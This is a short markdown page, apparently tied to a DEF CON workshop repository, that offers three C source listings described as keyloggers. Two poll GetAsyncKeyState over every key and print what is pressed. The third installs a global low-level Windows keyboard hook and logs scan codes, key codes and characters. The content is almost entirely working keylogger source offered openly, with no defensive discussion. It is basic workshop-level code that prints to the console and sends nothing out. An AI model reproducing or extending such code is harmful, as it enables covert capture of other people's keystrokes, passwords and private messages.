## This is 3 different source codes for 3 different key-loggers  (the actual source code) 

- https://github.com/loneicewolf/defcon-25-workshop/tree/master
# Probably the most basic
```c
#include <Windows.h>
#include <stdio.h>
int main(){while (1){
        for (int vKey = 0; vKey < 256; ++vKey){
            if (GetAsyncKeyState(vKey) != 0)
                printf("%c", vKey);}}
return 0;}
```


```c
#include <Windows.h>
#include <stdio.h>
int main(){
    int last_vKey = 0;
    while (1) {
        for (int vKey = 0; vKey < 255; ++vKey) {
            if (GetAsyncKeyState(last_vKey) != 0)
                continue;
            last_vKey = 0;
            if (GetAsyncKeyState(vKey) != 0) {
                last_vKey = vKey;
                printf("%c", vKey); }}}
    return 0;
}
```


```c
#include <Windows.h>
#include <stdio.h>
HHOOK hHook;
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    PKBDLLHOOKSTRUCT pk = (PKBDLLHOOKSTRUCT)lParam;
    printf("wParam: %s\t", (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) ? "DOWN" : "UP");
    printf("scanCode: %d\t", pk->scanCode);
    printf("vkCode: %d\t", pk->vkCode);
    printf("ASCII: %c\n", pk->vkCode);
    return CallNextHookEx(hHook, nCode, wParam, lParam);}

int main(){
    MSG msg;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;}
```
